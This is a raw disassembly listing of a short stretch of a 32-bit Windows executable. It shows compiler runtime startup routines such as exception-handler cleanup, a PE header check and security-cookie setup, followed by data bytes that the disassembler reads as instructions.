  4070e9:	5d                   	pop    %ebp
  4070ea:	c3                   	ret
  4070eb:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4070ee:	8b 00                	mov    (%eax),%eax
  4070f0:	33 c9                	xor    %ecx,%ecx
  4070f2:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%eax)
  4070f8:	0f 94 c1             	sete   %cl
  4070fb:	8b c1                	mov    %ecx,%eax
  4070fd:	c3                   	ret
  4070fe:	8b 65 e8             	mov    -0x18(%ebp),%esp
  407101:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  407108:	33 c0                	xor    %eax,%eax
  40710a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40710d:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  407114:	59                   	pop    %ecx
  407115:	5f                   	pop    %edi
  407116:	5e                   	pop    %esi
  407117:	5b                   	pop    %ebx
  407118:	8b e5                	mov    %ebp,%esp
  40711a:	5d                   	pop    %ebp
  40711b:	c3                   	ret
  40711c:	cc                   	int3
  40711d:	cc                   	int3
  40711e:	cc                   	int3
  40711f:	cc                   	int3
  407120:	8b ff                	mov    %edi,%edi
  407122:	55                   	push   %ebp
  407123:	8b ec                	mov    %esp,%ebp
  407125:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407128:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
  40712d:	66 39 01             	cmp    %ax,(%ecx)
  407130:	75 1f                	jne    0x407151
  407132:	8b 41 3c             	mov    0x3c(%ecx),%eax
  407135:	03 c1                	add    %ecx,%eax
  407137:	81 38 50 45 00 00    	cmpl   $0x4550,(%eax)
  40713d:	75 12                	jne    0x407151
  40713f:	b9 0b 01 00 00       	mov    $0x10b,%ecx
  407144:	66 39 48 18          	cmp    %cx,0x18(%eax)
  407148:	75 07                	jne    0x407151
  40714a:	b8 01 00 00 00       	mov    $0x1,%eax
  40714f:	5d                   	pop    %ebp
  407150:	c3                   	ret
  407151:	33 c0                	xor    %eax,%eax
  407153:	5d                   	pop    %ebp
  407154:	c3                   	ret
  407155:	8b ff                	mov    %edi,%edi
  407157:	55                   	push   %ebp
  407158:	8b ec                	mov    %esp,%ebp
  40715a:	83 ec 14             	sub    $0x14,%esp
  40715d:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  407161:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  407165:	a1 04 80 40 00       	mov    0x408004,%eax
  40716a:	56                   	push   %esi
  40716b:	57                   	push   %edi
  40716c:	bf 4e e6 40 bb       	mov    $0xbb40e64e,%edi
  407171:	be 00 00 ff ff       	mov    $0xffff0000,%esi
  407176:	3b c7                	cmp    %edi,%eax
  407178:	74 04                	je     0x40717e
  40717a:	85 c6                	test   %eax,%esi
  40717c:	75 64                	jne    0x4071e2
  40717e:	8d 45 f4             	lea    -0xc(%ebp),%eax
  407181:	50                   	push   %eax
  407182:	ff 15 68 a1 40 00    	call   *0x40a168
  407188:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40718b:	33 45 f4             	xor    -0xc(%ebp),%eax
  40718e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407191:	ff 15 70 a1 40 00    	call   *0x40a170
  407197:	31 45 fc             	xor    %eax,-0x4(%ebp)
  40719a:	ff 15 6c a1 40 00    	call   *0x40a16c
  4071a0:	31 45 fc             	xor    %eax,-0x4(%ebp)
  4071a3:	ff 15 64 a1 40 00    	call   *0x40a164
  4071a9:	33 45 fc             	xor    -0x4(%ebp),%eax
  4071ac:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4071af:	33 c1                	xor    %ecx,%eax
  4071b1:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4071b4:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4071b7:	50                   	push   %eax
  4071b8:	ff 15 74 a1 40 00    	call   *0x40a174
  4071be:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4071c1:	33 45 ec             	xor    -0x14(%ebp),%eax
  4071c4:	33 45 fc             	xor    -0x4(%ebp),%eax
  4071c7:	8b c8                	mov    %eax,%ecx
  4071c9:	3b c7                	cmp    %edi,%eax
  4071cb:	74 08                	je     0x4071d5
  4071cd:	85 35 04 80 40 00    	test   %esi,0x408004
  4071d3:	75 07                	jne    0x4071dc
  4071d5:	b8 4f e6 40 bb       	mov    $0xbb40e64f,%eax
  4071da:	8b c8                	mov    %eax,%ecx
  4071dc:	89 0d 04 80 40 00    	mov    %ecx,0x408004
  4071e2:	f7 d0                	not    %eax
  4071e4:	5f                   	pop    %edi
  4071e5:	a3 08 80 40 00       	mov    %eax,0x408008
  4071ea:	5e                   	pop    %esi
  4071eb:	8b e5                	mov    %ebp,%esp
  4071ed:	5d                   	pop    %ebp
  4071ee:	c3                   	ret
  4071ef:	68 00 00 03 00       	push   $0x30000
  4071f4:	68 00 00 01 00       	push   $0x10000
  4071f9:	ff 15 34 a2 40 00    	call   *0x40a234
  4071ff:	59                   	pop    %ecx
  407200:	59                   	pop    %ecx
  407201:	c3                   	ret
  407202:	ff 25 40 a2 40 00    	jmp    *0x40a240
  407208:	68 70 72 40 00       	push   $0x407270
  40720d:	64 ff 35 00 00 00 00 	push   %fs:0x0
  407214:	8b 44 24 10          	mov    0x10(%esp),%eax
  407218:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  40721c:	8d 6c 24 10          	lea    0x10(%esp),%ebp
  407220:	2b e0                	sub    %eax,%esp
  407222:	53                   	push   %ebx
  407223:	56                   	push   %esi
  407224:	57                   	push   %edi
  407225:	a1 04 80 40 00       	mov    0x408004,%eax
  40722a:	31 45 fc             	xor    %eax,-0x4(%ebp)
  40722d:	33 c5                	xor    %ebp,%eax
  40722f:	50                   	push   %eax
  407230:	89 65 e8             	mov    %esp,-0x18(%ebp)
  407233:	ff 75 f8             	push   -0x8(%ebp)
  407236:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407239:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  407240:	89 45 f8             	mov    %eax,-0x8(%ebp)
  407243:	8d 45 f0             	lea    -0x10(%ebp),%eax
  407246:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40724c:	c3                   	ret
  40724d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407250:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  407257:	59                   	pop    %ecx
  407258:	5f                   	pop    %edi
  407259:	5f                   	pop    %edi
  40725a:	5e                   	pop    %esi
  40725b:	5b                   	pop    %ebx
  40725c:	8b e5                	mov    %ebp,%esp
  40725e:	5d                   	pop    %ebp
  40725f:	51                   	push   %ecx
  407260:	c3                   	ret
  407261:	cc                   	int3
  407262:	cc                   	int3
  407263:	cc                   	int3
  407264:	cc                   	int3
  407265:	cc                   	int3
  407266:	cc                   	int3
  407267:	cc                   	int3
  407268:	cc                   	int3
  407269:	cc                   	int3
  40726a:	cc                   	int3
  40726b:	cc                   	int3
  40726c:	cc                   	int3
  40726d:	cc                   	int3
  40726e:	cc                   	int3
  40726f:	cc                   	int3
  407270:	8b ff                	mov    %edi,%edi
  407272:	55                   	push   %ebp
  407273:	8b ec                	mov    %esp,%ebp
  407275:	ff 75 14             	push   0x14(%ebp)
  407278:	ff 75 10             	push   0x10(%ebp)
  40727b:	ff 75 0c             	push   0xc(%ebp)
  40727e:	ff 75 08             	push   0x8(%ebp)
  407281:	68 e0 6c 40 00       	push   $0x406ce0
  407286:	68 04 80 40 00       	push   $0x408004
  40728b:	e8 13 00 00 00       	call   0x4072a3
  407290:	83 c4 18             	add    $0x18,%esp
  407293:	5d                   	pop    %ebp
  407294:	c3                   	ret
  407295:	cc                   	int3
  407296:	cc                   	int3
  407297:	cc                   	int3
  407298:	cc                   	int3
  407299:	cc                   	int3
  40729a:	cc                   	int3
  40729b:	cc                   	int3
  40729c:	cc                   	int3
  40729d:	cc                   	int3
  40729e:	cc                   	int3
  40729f:	cc                   	int3
  4072a0:	c2 00 00             	ret    $0x0
  4072a3:	ff 25 48 a2 40 00    	jmp    *0x40a248
  4072a9:	ff 25 4c a2 40 00    	jmp    *0x40a24c
  4072af:	ff 25 80 a2 40 00    	jmp    *0x40a280
  4072b5:	cc                   	int3
  4072b6:	cc                   	int3
  4072b7:	cc                   	int3
  4072b8:	fe                   	(bad)
  4072b9:	ff                   	(bad)
  4072ba:	ff                   	(bad)
  4072bb:	ff 00                	incl   (%eax)
  4072bd:	00 00                	add    %al,(%eax)
  4072bf:	00 88 ff ff ff 00    	add    %cl,0xffffff(%eax)
  4072c5:	00 00                	add    %al,(%eax)
  4072c7:	00 fe                	add    %bh,%dh
  4072c9:	ff                   	(bad)
  4072ca:	ff                   	(bad)
  4072cb:	ff                   	ljmp   (bad)
  4072cc:	ef                   	out    %eax,(%dx)
  4072cd:	6b 40 00 03          	imul   $0x3,0x0(%eax),%eax
  4072d1:	6c                   	insb   (%dx),%es:(%edi)
  4072d2:	40                   	inc    %eax
  4072d3:	00 00                	add    %al,(%eax)
  4072d5:	00 00                	add    %al,(%eax)
  4072d7:	00 fe                	add    %bh,%dh
  4072d9:	ff                   	(bad)
  4072da:	ff                   	(bad)
  4072db:	ff 00                	incl   (%eax)
  4072dd:	00 00                	add    %al,(%eax)
  4072df:	00 d4                	add    %dl,%ah
  4072e1:	ff                   	(bad)
  4072e2:	ff                   	(bad)
  4072e3:	ff 00                	incl   (%eax)
  4072e5:	00 00                	add    %al,(%eax)
  4072e7:	00 fe                	add    %bh,%dh
  4072e9:	ff                   	(bad)
  4072ea:	ff                   	(bad)
  4072eb:	ff a1 6f 40 00 a5    	jmp    *-0x5affbf91(%ecx)
  4072f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4072f2:	40                   	inc    %eax
  4072f3:	00 00                	add    %al,(%eax)
  4072f5:	00 00                	add    %al,(%eax)
  4072f7:	00 fe                	add    %bh,%dh
  4072f9:	ff                   	(bad)
  4072fa:	ff                   	(bad)
  4072fb:	ff 00                	incl   (%eax)
  4072fd:	00 00                	add    %al,(%eax)
  4072ff:	00 d8                	add    %bl,%al
  407301:	ff                   	(bad)
  407302:	ff                   	(bad)
  407303:	ff 00                	incl   (%eax)
  407305:	00 00                	add    %al,(%eax)
  407307:	00 fe                	add    %bh,%dh
  407309:	ff                   	(bad)
  40730a:	ff                   	(bad)
  40730b:	ff                   	ljmp   (bad)
  40730c:	eb 70                	jmp    0x40737e
  40730e:	40                   	inc    %eax
  40730f:	00 fe                	add    %bh,%dh
  407311:	70 40                	jo     0x407353
	...
